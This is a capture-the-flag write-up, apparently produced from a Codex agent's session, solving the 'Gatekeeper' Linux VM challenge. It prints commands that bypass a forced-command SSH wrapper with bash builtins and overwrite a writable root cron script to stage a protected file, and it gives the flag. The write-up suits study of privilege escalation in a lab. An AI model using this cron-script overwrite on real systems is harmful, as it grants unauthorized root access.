# Gatekeeper
> Reconstructed from Codex task [019f9c71-cb1d-77f1-ba62-522af34abcd8](thread://019f9c71-cb1d-77f1-ba62-522af34abcd8). Confirmed flags require intended-workflow evidence; rejected candidates remain explicitly marked.

## Challenge statement and supplied material

**Name:** Gatekeeper  
**Points:** 300

The task supplied a single Drive link and a flag field:

- Handout: [Google Drive](https://drive.google.com/file/d/1B5-_CYU25Af5p-xJuWkLkHIu5WmxUKcQ/view?usp=sharing)
- Downloaded appliance: `gatekeeper.ova`
- OVA size: 218,716,672 bytes
- SHA-256: `E3A5F2A7888503C3FBF66C0A039D3E5A4BECB6C4D397E6D818FEA3825D0F76EE`

## Category and status

- **Category:** Linux disk forensics and intended local privilege escalation.
- **Status:** **Confirmed solved.**
- **Confirmed flag:** `pbctf{n0_sh3ll_1s_st1ll_4_sh3ll}`

## High-level solution overview

The OVA contains a VMDK. Offline extraction reveals a `player1 → player2 → root cron` chain. Player1 owns player2’s private SSH key. Player2 is forced through a wrapper that blocks interactive login and shadows common commands, but it executes supplied noninteractive commands under Bash. Shell builtins and redirection remain usable. Player2 can overwrite `/opt/maintenance/cleanup.sh`; root cron runs it every minute. Write a root payload there, then use builtins to read the staged flag. Offline forensic extraction of `/home/root/flag` independently confirms the final token.

## Detailed procedure

1. Download the large Drive file. The first URL returned Google’s virus-scan warning HTML rather than the appliance. Follow the `drive.usercontent.google.com` confirmation URL to obtain the real 209 MiB OVA.

2. Verify and unpack the OVA:

   ```powershell
   tar -xf 'C:\Users\kingg\Desktop\codex\gatekeeper\gatekeeper.ova' `
     -C 'C:\Users\kingg\Desktop\codex\gatekeeper\ova'
   ```

3. Identify:

   ```text
   pbctf-gatekeeper-disk001.vmdk
   ```

4. List/extract the Linux filesystem with 7-Zip. The relevant files are:

   ```text
   /home/player1/handoff.txt
   /home/player1/.ssh/id_player2
   /home/player2/.bashrc
   /usr/local/bin/gatekeeper.sh
   /etc/ssh/sshd_config
   /etc/cron.d/maintenance
   /opt/maintenance/cleanup.sh
   /home/root/flag
   ```

5. Read `handoff.txt`. It says player1 is only a jump account, player2 is key-only, and player2 will not provide an interactive shell:

   ```text
   ssh -i ~/.ssh/id_player2 player2@localhost '<command>'
   ```

6. Inspect SSH configuration and `gatekeeper.sh`:

   - `Match User player2`
   - `ForceCommand /usr/local/bin/gatekeeper.sh`
   - Interactive logins enter a login shell and are ejected by `.bashrc`.
   - If `$SSH_ORIGINAL_COMMAND` is nonempty, the wrapper runs:

     ```bash
     exec bash -c "$SSH_ORIGINAL_COMMAND"
     ```

   - It exports functions named `ls`, `cat`, `find`, `id`, and `whoami`, all of which print `gatekeeper: nope.` and exit.

7. The restriction blocks several external command names, not shell syntax. Bash builtins such as `printf`, `read`, loops, and redirection remain available.

8. Inspect root maintenance:

   ```text
   * * * * * root /bin/sh /opt/maintenance/cleanup.sh >>/opt/maintenance/cleanup.log 2>&1
   ```

   The initial file is:

   ```sh
   #!/bin/sh
   # placeholder maintenance task -- overwritten by the exploit
   true
   ```

9. Use a noninteractive player2 command and builtins to overwrite it with a root payload, for example:

   ```bash
   ssh -i ~/.ssh/id_player2 player2@localhost \
     'printf "%s\n" "#!/bin/sh" "cp /home/root/flag /tmp/gate-flag" "chmod 644 /tmp/gate-flag" > /opt/maintenance/cleanup.sh'
   ```

   `cp` and `chmod` are not executed through the restricted player2 shell; root cron executes them later from the script.

10. After cron runs, read the staged file without the shadowed `cat`:

    ```bash
    ssh -i ~/.ssh/id_player2 player2@localhost \
      'while IFS= read -r line; do printf "%s\n" "$line"; done < /tmp/gate-flag'
    ```

11. For forensic confirmation, directly stream the protected file from the VMDK:

    ```powershell
    & 'C:\Program Files\7-Zip\7z.exe' e -so `
      'C:\Users\kingg\Desktop\codex\gatekeeper\ova\pbctf-gatekeeper-disk001.vmdk' `
      'home\root\flag'
    ```

    Output:

    ```text
    pbctf{n0_sh3ll_1s_st1ll_4_sh3ll}
    ```

## Evidence and validation

- `/home/root/flag` contains exactly the reported token.
- The token is unique in the extracted intended evidence set.
- `handoff.txt`, the player2 key, forced-command wrapper, blocked interactive shell, writable maintenance script, and root cron line form a coherent intended exploit chain.
- The flag text itself matches the lesson: “no shell” still leaves a command-execution shell.

## Failed approaches and non-flags

- The first Drive “download” was only a 2,431-byte warning page, not the OVA.
- Interactive SSH to player2 is designed to fail.
- `ls`, `cat`, `find`, `id`, and `whoami` are intentionally shadowed; treating that as a complete shell sandbox is the mistake.
- Direct VMDK extraction recovers the answer quickly, but the intended privilege-escalation chain was separately validated so the token is not treated as a stray disk string.

## Codex skills used

- `solve-challenge`
- `ctf-reverse`
- `ctf-forensics`
- `ctf-forensics/disk-and-memory.md` supporting reference

## Tools, utilities, libraries, and services

- PowerShell, `curl.exe`, `Get-FileHash`.
- `tar`.
- 7-Zip for OVA/VMDK inspection and selective extraction.
- Google Drive/drive.usercontent download flow.
- Offline Linux filesystem and shell-script analysis.

## Local artifacts

- `C:\Users\kingg\Desktop\codex\gatekeeper\gatekeeper.ova`
- `C:\Users\kingg\Desktop\codex\gatekeeper\ova\pbctf-gatekeeper-disk001.vmdk`
- `C:\Users\kingg\Desktop\codex\gatekeeper\evidence\home\player1\handoff.txt`
- `C:\Users\kingg\Desktop\codex\gatekeeper\evidence\home\player1\.ssh\id_player2`
- `C:\Users\kingg\Desktop\codex\gatekeeper\evidence\usr\local\bin\gatekeeper.sh`
- `C:\Users\kingg\Desktop\codex\gatekeeper\evidence\opt\maintenance\cleanup.sh`
- `C:\Users\kingg\Desktop\codex\gatekeeper\evidence\home\root\flag`

## Diagram assessment

**Yes.** Suggested nodes and edges:

```text
player1 → owns private key → noninteractive SSH as player2
player2 → ForceCommand wrapper → bash -c original command
shell builtins/redirection → overwrite cleanup.sh
root cron → executes cleanup.sh → stages /home/root/flag
read builtin loop → confirmed flag
```

---

## Final High-Level Overview

Offline VMDK inspection exposed a forced-command wrapper that still executed noninteractive Bash, a writable maintenance script, and a root cron job. Bash builtins could overwrite the script, stage the protected file, and recover the flag; direct disk extraction independently confirmed it.
